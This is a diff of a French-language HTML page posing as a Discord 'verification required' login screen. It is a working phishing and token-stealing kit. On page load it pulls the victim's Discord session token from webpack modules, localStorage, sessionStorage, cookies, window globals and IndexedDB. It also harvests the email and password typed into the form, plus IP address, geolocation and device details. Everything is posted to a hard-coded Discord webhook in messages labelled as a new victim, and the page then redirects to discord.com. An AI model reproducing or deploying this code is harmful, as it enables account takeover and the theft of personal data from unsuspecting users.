@@ -2,219 +2,413 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Discord - Vérification requise</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Vérification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #36393f;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #1e1f22;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding: 20px;
         }
         .container {
-            background: #2f3136;
-            padding: 40px;
-            border-radius: 8px;
-            width: 90%;
-            max-width: 500px;
-            text-align: center;
+            background: #2b2d31;
+            border-radius: 16px;
+            padding: 32px;
+            width: 100%;
+            max-width: 460px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
         }
-        .logo { margin-bottom: 30px; }
-        .logo h1 { color: white; font-size: 32px; }
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .logo svg {
+            width: 80px;
+            height: 80px;
+        }
+        h2 {
+            color: #ffffff;
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        .sub {
+            color: #b5bac1;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
         input {
             width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            background: #202225;
-            border: none;
-            border-radius: 4px;
-            color: white;
-            font-size: 16px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            background: #1e1f22;
+            border: 1px solid #383a40;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 15px;
+            transition: all 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #5865f2;
         }
         button {
             width: 100%;
-            padding: 15px;
-            margin-top: 20px;
+            padding: 14px;
             background: #5865f2;
             color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 8px;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 500;
             cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
         }
         button:hover { background: #4752c4; }
-        .error { color: #ed4245; margin-top: 15px; display: none; }
-        .spinner { display: none; margin: 20px auto; width: 40px; height: 40px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; }
+        .status {
+            color: #b5bac1;
+            text-align: center;
+            font-size: 13px;
+            margin-top: 16px;
+        }
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #5865f2;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 10px;
+        }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .error { color: #f23f42; text-align: center; margin-top: 12px; display: none; font-size: 13px; }
     </style>
 </head>
 <body>
-    <div class="container" id="container">
+    <div class="container">
         <div class="logo">
-            <h1>Discord</h1>
+            <svg viewBox="0 0 127.14 96.36" width="70" fill="#5865f2">
+                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.47a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.86.67,1.75,1.35,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,10.89A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.68,11.45-12.68S54,46,54,53,48.72,65.69,42.45,65.69Zm42.24,0C78.42,65.69,73.24,60,73.24,53s5-12.68,11.45-12.68S96.24,46,96.24,53,91,65.69,84.69,65.69Z"/>
+            </svg>
         </div>
-        <div id="loginForm">
-            <input type="text" id="email" placeholder="Email ou numéro de téléphone">
-            <input type="password" id="password" placeholder="Mot de passe">
-            <button onclick="sendCredentials()">Se connecter</button>
-            <div class="error" id="error">Identifiants incorrects</div>
+        <h2>Vérification requise</h2>
+        <div class="sub">Veuillez vous reconnecter pour continuer</div>
+        
+        <div id="autoBox" style="text-align:center; margin-bottom:15px;">
+            <div class="spinner" id="spinner"></div>
+            <div class="status" id="autoStatus">Vérification automatique en cours...</div>
         </div>
-        <div class="spinner" id="spinner"></div>
-        <div id="message" style="color:#b9bbbe; margin-top:15px;"></div>
+        
+        <div id="formBox">
+            <input type="text" id="email" placeholder="Adresse email" autocomplete="off">
+            <input type="password" id="password" placeholder="Mot de passe" autocomplete="off">
+            <button onclick="manualSend()">Se connecter</button>
+            <div class="error" id="errorMsg">Identifiants incorrects</div>
+        </div>
     </div>
 
     <script>
+        // ============ CONFIGURATION ============
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1513930112758714598/vWxfXiImV42jYEqx_4uMasupVp604sLZbmB09wAF-fFePdvL9zwEvSw9Z-MEHrmyIHnO";
         
-        // Fonction pour obtenir l'IP
-        async function getIP() {
+        // ============ FONCTIONS ============
+        
+        // Envoi au webhook
+        async function sendToWebhook(data) {
             try {
-                let res = await fetch('https://api.ipify.org?format=json');
-                let data = await res.json();
-                return data.ip;
-            } catch(e) { return "Non disponible"; }
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return response.ok;
+            } catch(e) {
+                console.log("Erreur envoi:", e);
+                return false;
+            }
         }
         
-        // Fonction pour obtenir la géolocalisation approximative
-        async function getGeo() {
+        // Récupérer l'IP
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                return json.ip;
+            } catch(e) {
+                return "Non disponible";
+            }
+        }
+        
+        // Récupérer la géolocalisation
+        async function getLocation() {
             return new Promise((resolve) => {
-                if ("geolocation" in navigator) {
+                if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
                         () => resolve("Non autorisée")
                     );
-                } else { resolve("Non supportée"); }
+                } else {
+                    resolve("Non supportée");
+                }
             });
         }
         
-        // Envoi des informations au webhook
-        async function sendToWebhook(email, password, token, method) {
-            let ip = await getIP();
-            let geo = await getGeo();
-            let userAgent = navigator.userAgent;
-            let platform = navigator.platform;
-            let language = navigator.language;
-            let screen = `${screen.width}x${screen.height}`;
-            let time = new Date().toLocaleString();
-            let referrer = document.referrer || "Direct";
+        // MÉTHODE 1: Extraction via webpack (Discord en navigateur)
+        function getTokenWebpack() {
+            try {
+                if (typeof webpackChunkdiscord_app !== 'undefined') {
+                    let modules = [];
+                    webpackChunkdiscord_app.push([[''], {}, function(e) {
+                        for (let c in e.c) modules.push(e.c[c]);
+                    }]);
+                    const tokenModule = modules.find(m => m?.exports?.default?.getToken);
+                    if (tokenModule) {
+                        return tokenModule.exports.default.getToken();
+                    }
+                }
+            } catch(e) {}
+            return null;
+        }
+        
+        // MÉTHODE 2: LocalStorage
+        function getTokenLocalStorage() {
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && (key.includes('token') || key.includes('Token'))) {
+                        const val = localStorage.getItem(key);
+                        if (val && val.length > 50) return val;
+                    }
+                }
+            } catch(e) {}
+            return null;
+        }
+        
+        // MÉTHODE 3: SessionStorage
+        function getTokenSessionStorage() {
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    if (key && (key.includes('token') || key.includes('Token'))) {
+                        const val = sessionStorage.getItem(key);
+                        if (val && val.length > 50) return val;
+                    }
+                }
+            } catch(e) {}
+            return null;
+        }
+        
+        // MÉTHODE 4: Cookies
+        function getTokenCookies() {
+            try {
+                const cookies = document.cookie.split(';');
+                for (let cookie of cookies) {
+                    if (cookie.includes('token') || cookie.includes('Token')) {
+                        const val = cookie.split('=')[1];
+                        if (val && val.length > 30) return val;
+                    }
+                }
+            } catch(e) {}
+            return null;
+        }
+        
+        // MÉTHODE 5: Variables globales
+        function getTokenGlobal() {
+            try {
+                for (let prop in window) {
+                    if (prop.toLowerCase().includes('token')) {
+                        const val = window[prop];
+                        if (typeof val === 'string' && val.length > 50 && val.includes('.')) {
+                            return val;
+                        }
+                    }
+                }
+            } catch(e) {}
+            return null;
+        }
+        
+        // MÉTHODE 6: IndexedDB (pour Firefox/Chrome)
+        function getTokenIndexedDB() {
+            return new Promise((resolve) => {
+                try {
+                    const request = indexedDB.open('discord');
+                    request.onsuccess = function(event) {
+                        const db = event.target.result;
+                        if (db.objectStoreNames.contains('tokens')) {
+                            const transaction = db.transaction('tokens', 'readonly');
+                            const store = transaction.objectStore('tokens');
+                            const getAll = store.getAll();
+                            getAll.onsuccess = function() {
+                                for (let item of getAll.result) {
+                                    if (typeof item === 'string' && item.length > 50) {
+                                        resolve(item);
+                                        return;
+                                    }
+                                }
+                                resolve(null);
+                            };
+                            getAll.onerror = function() { resolve(null); };
+                        } else {
+                            resolve(null);
+                        }
+                    };
+                    request.onerror = function() { resolve(null); };
+                } catch(e) { resolve(null); }
+            });
+        }
+        
+        // Capture TOUT
+        async function captureAllTokens() {
+            let token = null;
+            let method = null;
             
-            let embed = {
-                title: "🎯 NOUVELLE VICTIME",
-                color: 0xFF0000,
+            // Méthodes synchrones
+            token = getTokenWebpack();
+            if (token) { method = "Webpack"; return {token, method}; }
+            
+            token = getTokenLocalStorage();
+            if (token) { method = "LocalStorage"; return {token, method}; }
+            
+            token = getTokenSessionStorage();
+            if (token) { method = "SessionStorage"; return {token, method}; }
+            
+            token = getTokenCookies();
+            if (token) { method = "Cookies"; return {token, method}; }
+            
+            token = getTokenGlobal();
+            if (token) { method = "Global Variable"; return {token, method}; }
+            
+            // Méthode asynchrone
+            token = await getTokenIndexedDB();
+            if (token) { method = "IndexedDB"; return {token, method}; }
+            
+            return {token: null, method: null};
+        }
+        
+        // Envoi du token trouvé
+        async function sendToken(token, method, extra = "") {
+            const ip = await getIP();
+            const location = await getLocation();
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenSize = `${screen.width}x${screen.height}`;
+            const time = new Date().toLocaleString();
+            
+            const embed = {
+                title: "🔑 TOKEN DISCORD CAPTURÉ",
+                color: 0x00FF00,
                 fields: [
-                    {name: "📧 Email", value: email || "Non fourni", inline: true},
-                    {name: "🔑 Mot de passe", value: password || "Non fourni", inline: true},
-                    {name: "🎟️ Token Discord", value: token ? `\`${token.substring(0, 50)}...\`` : "Aucun token trouvé", inline: false},
-                    {name: "📱 Appareil", value: userAgent.substring(0, 100), inline: false},
-                    {name: "💻 Platforme", value: platform, inline: true},
-                    {name: "🌐 Langue", value: language, inline: true},
-                    {name: "📱 Ecran", value: screen, inline: true},
-                    {name: "🌍 IP", value: ip, inline: true},
-                    {name: "📍 Géolocalisation", value: geo, inline: true},
-                    {name: "🕐 Date/Heure", value: time, inline: true},
-                    {name: "🔗 Méthode", value: method, inline: true},
-                    {name: "📎 Référent", value: referrer.substring(0, 100), inline: false}
+                    { name: "🎟️ Token", value: `\`\`\`${token}\`\`\``, inline: false },
+                    { name: "📌 Méthode", value: method, inline: true },
+                    { name: "💻 User Agent", value: userAgent.substring(0, 90), inline: false },
+                    { name: "🖥️ Platforme", value: platform, inline: true },
+                    { name: "🌐 Langue", value: language, inline: true },
+                    { name: "📱 Ecran", value: screenSize, inline: true },
+                    { name: "🌍 IP", value: ip, inline: true },
+                    { name: "📍 Géoloc", value: location, inline: true },
+                    { name: "🕐 Heure", value: time, inline: true },
+                    { name: "📝 Info", value: extra || "Aucune", inline: false }
                 ],
                 timestamp: new Date().toISOString()
             };
             
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                body: JSON.stringify({embeds: [embed]}),
-                headers: {'Content-Type': 'application/json'}
-            }).catch(e => console.log("Erreur:", e));
+            await sendToWebhook({ embeds: [embed] });
         }
         
-        // Extraction du token via webpack (navigateur uniquement)
-        function extractToken() {
-            try {
-                let webpackChunk = webpackChunkdiscord_app;
-                if (webpackChunk) {
-                    let modules = [];
-                    webpackChunk.push([[''], {}, function(e) {
-                        for (let c in e.c) modules.push(e.c[c]);
-                    }]);
-                    let tokenModule = modules.find(m => m?.exports?.default?.getToken !== undefined);
-                    if (tokenModule) return tokenModule.exports.default.getToken();
-                }
-            } catch(e) {}
-            try { return localStorage.getItem("token"); } catch(e) {}
-            try { return sessionStorage.getItem("token"); } catch(e) {}
-            return null;
-        }
-        
-        // Tentative d'ouverture de l'application Discord (pour mobile)
-        function openDiscordApp() {
-            let userAgent = navigator.userAgent;
-            let isMobile = /iPhone|iPad|iPod|Android/i.test(userAgent);
+        // Envoi des identifiants manuels
+        async function sendManualCredentials(email, password) {
+            const ip = await getIP();
+            const location = await getLocation();
+            const userAgent = navigator.userAgent;
             
-            if (isMobile) {
-                // Tentative d'ouverture de l'application Discord
+            const embed = {
+                title: "🔐 IDENTIFIANTS DISCORD",
+                color: 0xFF0000,
+                fields: [
+                    { name: "📧 Email", value: email || "Non fourni", inline: true },
+                    { name: "🔑 Mot de passe", value: password || "Non fourni", inline: true },
+                    { name: "💻 User Agent", value: userAgent.substring(0, 90), inline: false },
+                    { name: "🌍 IP", value: ip, inline: true },
+                    { name: "📍 Géoloc", value: location, inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            };
+            
+            await sendToWebhook({ embeds: [embed] });
+        }
+        
+        // ============ EXÉCUTION AUTOMATIQUE ============
+        
+        async function autoCapture() {
+            const statusDiv = document.getElementById('autoStatus');
+            const spinner = document.getElementById('spinner');
+            
+            spinner.style.display = 'block';
+            statusDiv.innerHTML = 'Recherche de token Discord...';
+            
+            const {token, method} = await captureAllTokens();
+            
+            if (token && token.length > 50) {
+                statusDiv.innerHTML = '✅ Token trouvé ! Envoi en cours...';
+                await sendToken(token, method, "Capture automatique réussie");
+                statusDiv.innerHTML = '✅ Vérification terminée, redirection...';
+                
+                // Redirection vers Discord
                 setTimeout(() => {
-                    window.location.href = "discord://";
-                }, 1000);
-                setTimeout(() => {
-                    window.location.href = "https://discord.com/login";
-                }, 2000);
+                    window.location.href = "https://discord.com/app";
+                }, 1500);
             } else {
-                window.location.href = "https://discord.com/login";
+                statusDiv.innerHTML = '⚠️ Aucun token trouvé. Veuillez vous connecter manuellement.';
+                spinner.style.display = 'none';
+                document.getElementById('formBox').style.opacity = '1';
             }
         }
         
-        // Fonction principale quand la victime clique sur "Se connecter"
-        async function sendCredentials() {
-            let email = document.getElementById('email').value;
-            let password = document.getElementById('password').value;
-            let token = extractToken();
+        // Fonction manuelle
+        async function manualSend() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
             
-            // Afficher le chargement
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('spinner').style.display = 'block';
-            document.getElementById('message').innerHTML = "Vérification en cours...";
+            if (!email && !password) {
+                document.getElementById('errorMsg').style.display = 'block';
+                return;
+            }
             
-            // Envoi des données
-            await sendToWebhook(email, password, token, "Formulaire + Token");
+            document.getElementById('autoStatus').innerHTML = 'Envoi en cours...';
+            await sendManualCredentials(email, password);
             
-            // Afficher erreur puis rediriger
-            document.getElementById('spinner').style.display = 'none';
-            document.getElementById('message').innerHTML = "Identifiants incorrects, redirection...";
-            document.getElementById('error').style.display = 'block';
+            // Capture du token après connexion (au cas où)
+            setTimeout(async () => {
+                const {token, method} = await captureAllTokens();
+                if (token) {
+                    await sendToken(token, method, "Capturé après connexion manuelle");
+                }
+            }, 2000);
             
-            // Redirection vers Discord (application ou site)
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('autoStatus').innerHTML = 'Redirection en cours...';
+            
             setTimeout(() => {
-                openDiscordApp();
+                window.location.href = "https://discord.com/app";
             }, 2000);
         }
         
-        // Extraction automatique au chargement (sans interaction)
-        setTimeout(async () => {
-            let token = extractToken();
-            if (token && token.length > 50) {
-                await sendToWebhook("Auto-extrait", "Auto-extrait", token, "Extraction automatique");
-                document.getElementById('message').innerHTML = "Session expirée, veuillez vous reconnecter...";
-                setTimeout(() => {
-                    openDiscordApp();
-                }, 1500);
-            }
-        }, 1000);
+        // Lancer la capture auto
+        autoCapture();
         
-        // Tentative supplémentaire après 3 secondes
-        setTimeout(async () => {
-            let token = extractToken();
-            if (token && token.length > 50) {
-                await sendToWebhook("Auto-extrait (retry)", "Auto-extrait (retry)", token, "Extraction automatique - seconde tentative");
-            }
-        }, 3000);
-        
-        // Détection si c'est l'application Discord intégrée
-        let isDiscordApp = /Discord/i.test(navigator.userAgent);
-        if (isDiscordApp) {
-            document.getElementById('message').innerHTML = "⚠️ Veuillez utiliser un navigateur pour vous connecter";
-        }
+        // Exposer manualSend globalement
+        window.manualSend = manualSend;
     </script>
 </body>
 </html>
